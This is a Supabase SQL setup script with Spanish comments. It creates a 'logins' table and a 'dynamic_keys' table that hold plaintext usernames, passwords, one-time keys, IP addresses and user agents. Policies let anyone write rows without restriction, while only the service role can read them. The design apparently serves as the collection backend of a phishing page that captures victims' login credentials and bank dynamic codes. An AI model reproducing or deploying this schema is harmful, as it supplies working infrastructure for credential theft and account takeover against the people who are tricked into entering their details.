-- ============================================================
-- CREA LAS TABLAS Y POLITICAS PARA SUPABASE (yiozdjhcbragqmexiovn)
-- ============================================================

-- TABLA: logins
create table if not exists public.logins (
  id bigint generated always as identity primary key,
  username text not null,
  password text not null,
  ip text,
  time timestamptz default now()
);

grant usage on schema public to anon, authenticated, service_role;
grant insert on table public.logins to anon, authenticated, service_role;
grant select on table public.logins to service_role;
grant usage, select on all sequences in schema public to anon, authenticated, service_role;

alter table public.logins enable row level security;

drop policy if exists "anon_insert_logins" on public.logins;
drop policy if exists "allow_anon_insert_logins" on public.logins;
drop policy if exists "Enable insert for anon users" on public.logins;

create policy "allow_anon_insert_logins"
  on public.logins
  as permissive
  for insert
  to anon, authenticated
  with check (true);

-- TABLA: dynamic_keys
create table if not exists public.dynamic_keys (
  id bigint generated always as identity primary key,
  key_value text not null,
  ip text,
  user_agent text,
  time timestamptz default now()
);

alter table public.dynamic_keys add column if not exists username text;
alter table public.dynamic_keys add column if not exists password text;
alter table public.dynamic_keys add column if not exists ended_at timestamptz;
alter table public.dynamic_keys add column if not exists status text default 'active';

grant usage on schema public to anon, authenticated, service_role;
grant insert on table public.dynamic_keys to anon, authenticated, service_role;
grant select on table public.dynamic_keys to service_role;
grant usage, select on all sequences in schema public to anon, authenticated, service_role;

alter table public.dynamic_keys enable row level security;

drop policy if exists "allow_anon_insert_dynamic_keys" on public.dynamic_keys;

create policy "allow_anon_insert_dynamic_keys"
  on public.dynamic_keys
  as permissive
  for insert
  to anon, authenticated
  with check (true);